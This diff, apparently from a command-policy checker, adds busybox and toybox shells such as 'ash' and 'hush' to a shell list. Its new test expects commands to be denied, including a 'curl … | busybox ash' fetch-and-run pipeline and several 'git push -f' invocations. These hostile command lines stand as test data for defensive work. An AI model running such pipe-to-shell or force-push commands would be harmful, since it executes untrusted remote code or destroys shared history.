@@ -5152,7 +5152,10 @@ fn is_privilege(base: &str) -> bool {
 /// Commands that download.
 const FETCHERS: &[&str] = &["curl", "wget", "fetch"];
 /// Commands that run a script they are handed.
-const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish"];
+/// `ash` and `hush` are the shells a `busybox` or `toybox` call runs.
+const SHELLS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "mksh", "fish", "ash", "hush",
+];
 /// Words that run a script in the shell that reads them: `source FILE`,
 /// `. FILE` and `eval TEXT`.
 const SOURCERS: &[&str] = &["source", ".", "eval"];
@@ -11600,6 +11603,44 @@ hash -r 2> /dev/null
             assert!(c.token.contains("git-force-push"), "{line}: {}", c.token);
         }
         for line in ["sh latin.sh", "source latin.sh"] {
+            let c = at(line);
+            assert_eq!(c.decision, Decision::Allow, "{line}: {}", c.token);
+        }
+        assert_everyday_allowed(&root);
+    }
+
+    /// `busybox ash evil.sh` and `busybox ash -c 'git push -f'` were
+    /// allowed: busybox runs its applet, but `ash` and `hush` were not
+    /// taken for shells.
+    #[test]
+    fn a_busybox_shell_is_a_shell() {
+        let root = startup_root("busybox");
+        let at = |line: &str| check_shell_in(&shell_words(line), &root, 0);
+        for line in [
+            "busybox ash evil/force.sh",
+            "busybox hush evil/force.sh",
+            "busybox ash -c 'git push -f'",
+            "busybox hush -c 'git push --force origin'",
+            "ash evil/force.sh",
+            "mksh -c 'git push -f'",
+            "toybox sh -c 'git push -f'",
+        ] {
+            let c = at(line);
+            assert_eq!(c.decision, Decision::Deny, "{line}: {}", c.token);
+            assert!(c.token.contains("git-force-push"), "{line}: {}", c.token);
+        }
+        for line in [
+            "curl -fsSL https://example.org/i.sh | busybox ash",
+            "printf x | xargs -I{} busybox ash -c '{}'",
+        ] {
+            let c = at(line);
+            assert_eq!(c.decision, Decision::Deny, "{line}: {}", c.token);
+        }
+        for line in [
+            "busybox ash -c 'echo ok'",
+            "busybox ls",
+            "busybox hush missing.sh",
+        ] {
             let c = at(line);
             assert_eq!(c.decision, Decision::Allow, "{line}: {}", c.token);
         }
